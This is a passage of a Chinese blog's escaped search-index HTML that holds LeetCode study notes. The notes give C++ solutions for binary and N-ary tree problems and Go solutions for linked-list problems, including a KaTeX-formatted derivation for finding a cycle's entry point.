            st.push(rightNode-&amp;gt;left);
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉树的最大深度&#34;&gt;二叉树的最大深度&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/&lt;/p&gt;
&lt;p&gt;递归法很简单&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int res = 0;
    int maxDepth(TreeNode* root) {
        if (root == NULL) return 0;
        getdepth(root, 1);
        return res;
    }

    void getdepth(TreeNode* root, int k) {
        if (res &amp;lt; k) res = k;
        if (root-&amp;gt;left) getdepth(root-&amp;gt;left, k + 1);
        if (root-&amp;gt;right) getdepth(root-&amp;gt;right, k + 1);
    }

};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果要是迭代法就是使用层次遍历，计算以下有多少层&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int maxDepth(TreeNode* root) {
        if (root == NULL) return 0;
        int res = 0;
        queue&amp;lt;TreeNode*&amp;gt; q;
        q.push(root);

        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i++ ) {
                TreeNode* node = q.front();
                q.pop();
                if (node-&amp;gt;left) q.push(node-&amp;gt;left);
                if (node-&amp;gt;right) q.push(node-&amp;gt;right);
            }
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;多叉树的深度&#34;&gt;多叉树的深度&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-depth-of-n-ary-tree/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int maxDepth(Node* root) {
        if (!root) return 0;
        int res = 0;
        queue&amp;lt;Node*&amp;gt; q;
        q.push(root);
        
        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i ++) {
                Node* node = q.front();
                q.pop();
                for (int j = 0; j &amp;lt; node-&amp;gt;children.size(); j++ ) {
                    q.push(node-&amp;gt;children[j]);
                }
            } 
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉树的最小深度&#34;&gt;二叉树的最小深度&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/&lt;/p&gt;
&lt;p&gt;用层次遍历，当遇到左右孩子都为空的节点(叶子节点)时就返回，&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int minDepth(TreeNode* root) {
        if (!root) return 0;
        int res = 0;
        queue&amp;lt;TreeNode*&amp;gt; q;
        q.push(root);

        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i++) {
                TreeNode* node = q.front();
                q.pop();
                if (!node-&amp;gt;left &amp;amp;&amp;amp; !node-&amp;gt;right) return res;
                if (node-&amp;gt;left) q.push(node-&amp;gt;left);
                if (node-&amp;gt;right) q.push(node-&amp;gt;right);
            }
            
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉树的所有路径&#34;&gt;二叉树的所有路径&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/binary-tree-paths/&lt;/p&gt;
&lt;p&gt;这道题就是一道回溯题，递归的出口就是遇到叶子节点，麻烦的一点就是整数转字符串，C++不能直接转&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;string&amp;gt; binaryTreePaths(TreeNode* root) {
        string path = &amp;quot;&amp;quot;;
        backtracking(root, path);
        return res;
    }

    void backtracking(TreeNode* root, string path) {
        if (!root-&amp;gt;left &amp;amp;&amp;amp; !root-&amp;gt;right) {
            if (path != &amp;quot;&amp;quot;) path += &amp;quot;-&amp;gt;&amp;quot;;
            path += intToString(root-&amp;gt;val);
            res.push_back(path);
            return ;
        }
        
        if (path != &amp;quot;&amp;quot;) path += &amp;quot;-&amp;gt;&amp;quot;; 

        if (root-&amp;gt;left) backtracking(root-&amp;gt;left, path + intToString(root-&amp;gt;val));
        if (root-&amp;gt;right) backtracking(root-&amp;gt;right, path + intToString(root-&amp;gt;val));
    }

    string intToString(int x) {
        if (x == 0)  return &amp;quot;0&amp;quot;;
        string str = &amp;quot;&amp;quot;;
        bool negative = 0;
        if (x &amp;lt; 0) {
            negative = 1;
            x = -x;
        }
        while (x != 0) {
            string tmp = &amp;quot;&amp;quot;;
            tmp += x % 10 + &#39;0&#39;;
            str = tmp + str;
            x /= 10;
        }
        if (negative) 
        	return &amp;quot;-&amp;quot; + str;
        return str;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;平衡二叉树&#34;&gt;平衡二叉树&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/balanced-binary-tree/&lt;/p&gt;
&lt;p&gt;要保证所有的节点都是平衡二叉树，所以每层递归都要返回该节点的高度，让上一层递归去判断左右子树的高度差。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isBalanced(TreeNode* root) {
        if (!root) return true;
        return level(root) != -1;
    }

    int level(TreeNode* root) {
        if(!root) return 0;
        int left = level(root-&amp;gt;left);
        if (left == -1) return -1;
        int right = level(root-&amp;gt;right);
        if (right == -1) return -1;
        return abs(left - right) &amp;gt; 1 ? -1 : max(left, right) + 1;
    }
};
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】树</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-lian-biao/"" data-c="
          &lt;h3 id=&#34;移除链表元素&#34;&gt;移除链表元素&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-linked-list-elements/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeElements(head *ListNode, val int) *ListNode {

    for head != nil &amp;amp;&amp;amp; head.Val == val {
        head = head.Next
    }

    p := head

    for p != nil &amp;amp;&amp;amp; p.Next != nil {
        if p.Next.Val == val {
            p.Next = p.Next.Next
        } else {
            p = p.Next
        }
    }

    return head
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;设计链表&#34;&gt;设计链表&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/design-linked-list/&lt;/p&gt;
&lt;p&gt;好家伙！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type MyLinkedList struct {
    Val int
    Next *MyLinkedList
}


func Constructor() MyLinkedList {
    return MyLinkedList{
        Val : 0,
        Next : nil,
    }
}

func (this *MyLinkedList) GetLen() int {
    len := 0
    for this != nil {
        len ++
        this = this.Next
    }
    return len - 1 // 去掉头节点
}


func (this *MyLinkedList) Get(index int) int {
    i := -1 // -1当作是头节点的下标
    for i != index &amp;amp;&amp;amp; this != nil {
        i ++
        this = this.Next
    }
    if i == index &amp;amp;&amp;amp; this != nil {
        return this.Val
    }
    return -1
}


func (this *MyLinkedList) AddAtHead(val int)  {
    head := &amp;amp;MyLinkedList {
        Val : val,
        Next : this.Next,
    }
    this.Next = head
}


func (this *MyLinkedList) AddAtTail(val int)  {
    tail := &amp;amp;MyLinkedList {
        Val : val,
        Next : nil,
    }
    for this.Next != nil {
        this = this.Next
    }
    this.Next = tail
}


func (this *MyLinkedList) AddAtIndex(index int, val int)  {
    if index &amp;lt; 0 {
        this.AddAtHead(val)
    } else if index == this.GetLen() {
        this.AddAtTail(val)
    } else if index &amp;lt; this.GetLen() {
        i := -1
        for i != index - 1 {
            i ++
            this = this.Next
        }
        tmp := &amp;amp;MyLinkedList {
                Val : val,
                Next : this.Next,
            }
        this.Next = tmp
    }

}


func (this *MyLinkedList) DeleteAtIndex(index int)  {
    if index &amp;gt;= this.GetLen() {
        return 
    }
    i := -1
    for i != index - 1 {
        i++
        this = this.Next
    }
    this.Next = this.Next.Next
}


/**
 * Your MyLinkedList object will be instantiated and called as such:
 * obj := Constructor();
 * param_1 := obj.Get(index);
 * obj.AddAtHead(val);
 * obj.AddAtTail(val);
 * obj.AddAtIndex(index,val);
 * obj.DeleteAtIndex(index);
 */
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;反转链表&#34;&gt;反转链表&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reverse-linked-list/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func reverseList(head *ListNode) *ListNode {
    if head == nil || head.Next == nil {
        return head
    }
    pre := head
    current := head.Next
    pre.Next = nil
    for current != nil {
        tmp := current.Next
        current.Next = pre
        pre = current
        current = tmp
    }
    return pre
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;两两交换链表中的节点&#34;&gt;两两交换链表中的节点&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/swap-nodes-in-pairs/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func swapPairs(head *ListNode) *ListNode {

    if head == nil || head.Next == nil {
        return head
    }

    ans := head.Next
    var pre *ListNode

    for head != nil &amp;amp;&amp;amp; head.Next != nil {
        if pre != nil {
            pre.Next = head.Next
        }
        pre = head
        head = head.Next
        tmp := head.Next
        head.Next = pre
        pre.Next = tmp
        head = tmp
    }

    return ans
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;环形链表ii&#34;&gt;环形链表Ⅱ※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/linked-list-cycle-ii/&lt;/p&gt;
&lt;p&gt;设置快慢指针，快指针一次走两步，慢指针一次走一步，二者相遇时一定是在环内，假设头节点到环的入口距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，入口到快慢指针相遇的位置距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，从相遇位置到环入口位置距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684334727.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;相遇时，慢指针走过的距离为：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;快指针走过的距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;而快指针走过的节点是慢指针的二倍，即：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2(x+y)=x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最终要求的是&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=(n-1)(y+z)+z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;当&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;n=1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;时，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; 